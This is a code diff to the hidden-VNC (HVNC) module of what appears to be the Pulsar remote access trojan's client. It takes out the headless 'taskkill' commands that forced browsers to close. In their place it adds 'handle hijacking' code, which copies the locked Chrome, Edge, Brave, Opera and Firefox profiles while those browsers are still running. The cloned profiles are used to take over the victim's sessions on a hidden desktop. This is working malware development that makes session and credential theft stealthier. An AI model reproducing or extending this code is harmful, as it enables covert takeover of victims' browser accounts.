@@ -124,12 +124,10 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 string text = Path.Combine(path, "fudasf");
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
                 if (!Directory.Exists(text))
                 {
                     Directory.CreateDirectory(text);
-                    this.CreateProc(filePath);
-                    this.CloneDirectory(sourceDir, text);
+                    HandleHijacker.ForceCopyDirectory(sourceDir, text, killIfFailed: false);
                 }
                 else
                 {
@@ -159,23 +157,6 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 Debug.WriteLine($"Found Brave at: {braveConfig.ExecutablePath}");
-
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-                STARTUPINFO startupInfo = default(STARTUPINFO);
-                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
-                startupInfo.lpDesktop = this.DesktopName;
-                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
-
-                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
-                {
-                    Debug.WriteLine("Waiting for Brave processes to terminate...");
-                    WaitForProcessCompletion(processInfo, 5000);
-                }
-                else
-                {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
-                }
 
                 CloneBrowserProfile(braveConfig.SearchPattern, braveConfig.ReplacementPath);
 
@@ -207,23 +188,6 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 Debug.WriteLine($"Found Opera at: {operaConfig.ExecutablePath}");
-
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM opera.exe /F";
-                STARTUPINFO startupInfo = default(STARTUPINFO);
-                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
-                startupInfo.lpDesktop = this.DesktopName;
-                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
-
-                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
-                {
-                    Debug.WriteLine("Waiting for Opera processes to terminate...");
-                    WaitForProcessCompletion(processInfo, 5000);
-                }
-                else
-                {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
-                }
 
                 CloneBrowserProfile(operaConfig.SearchPattern, operaConfig.ReplacementPath);
 
@@ -261,23 +225,6 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 Debug.WriteLine($"Found OperaGX at: {operaGXConfig.ExecutablePath}");
-
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM operagx.exe /F";
-                STARTUPINFO startupInfo = default(STARTUPINFO);
-                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
-                startupInfo.lpDesktop = this.DesktopName;
-                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
-
-                if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
-                {
-                    Debug.WriteLine("Waiting for OperaGX processes to terminate...");
-                    WaitForProcessCompletion(processInfo, 5000);
-                }
-                else
-                {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
-                }
 
                 CloneBrowserProfile(operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
 
@@ -317,23 +264,6 @@ namespace Pulsar.Client.Helper.HVNC
 
                 Debug.WriteLine($"Found Edge at: {edgeConfig.ExecutablePath}");
 
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
-                STARTUPINFO startupInfo = default(STARTUPINFO);
-                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
-                startupInfo.lpDesktop = this.DesktopName;
-                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
-
-                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
-                {
-                    Debug.WriteLine("Waiting for Edge processes to terminate...");
-                    WaitForProcessCompletion(processInfo, 5000);
-                }
-                else
-                {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
-                }
-
                 CloneBrowserProfile(edgeConfig.SearchPattern, edgeConfig.ReplacementPath);
 
                 try
@@ -364,23 +294,6 @@ namespace Pulsar.Client.Helper.HVNC
                 }
 
                 Debug.WriteLine($"Found Chrome at: {chromeConfig.ExecutablePath}");
-
-                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
-                STARTUPINFO startupInfo = default(STARTUPINFO);
-                startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
-                startupInfo.lpDesktop = this.DesktopName;
-                PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
-
-                if (CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
-                {
-                    Debug.WriteLine("Waiting for Chrome processes to terminate...");
-                    WaitForProcessCompletion(processInfo, 5000);
-                }
-                else
-                {
-                    Debug.WriteLine("Failed to create taskkill process, using fallback delay.");
-                    Thread.Sleep(500);
-                }
 
                 CloneBrowserProfile(chromeConfig.SearchPattern, chromeConfig.ReplacementPath);
 
@@ -460,9 +373,9 @@ namespace Pulsar.Client.Helper.HVNC
                     {
                         Thread.Sleep(2000);
                         Task.Run(async () =>
-            {
-                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-            });
+                        {
+                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                        });
                     }
                 }
                 catch (Exception injectionEx)
@@ -523,6 +436,7 @@ namespace Pulsar.Client.Helper.HVNC
 
         /// <summary>
         /// Clones browser profile from SearchPattern to ReplacementPath
+        /// Uses handle hijacking to copy locked files without killing the browser
         /// </summary>
         /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
         /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
@@ -567,8 +481,17 @@ namespace Pulsar.Client.Helper.HVNC
                     DeleteFolder(destDir);
                 }
 
-                CloneDirectory(sourceDir, destDir);
-                Debug.WriteLine("Browser profile cloned successfully.");
+                Debug.WriteLine("[BrowserClone] Using handle hijacking for locked files...");
+                bool success = HandleHijacker.ForceCopyDirectory(sourceDir, destDir, killIfFailed: false);
+
+                if (success)
+                {
+                    Debug.WriteLine("[BrowserClone] Browser profile cloned successfully with handle hijacking.");
+                }
+                else
+                {
+                    Debug.WriteLine("[BrowserClone] Handle hijacking partial success, some files may be skipped.");
+                }
             }
             catch (Exception ex)
             {
@@ -625,7 +548,7 @@ namespace Pulsar.Client.Helper.HVNC
 
                 string processName = Path.GetFileNameWithoutExtension(browserPath);
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {processName}.exe /F";
-                
+
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
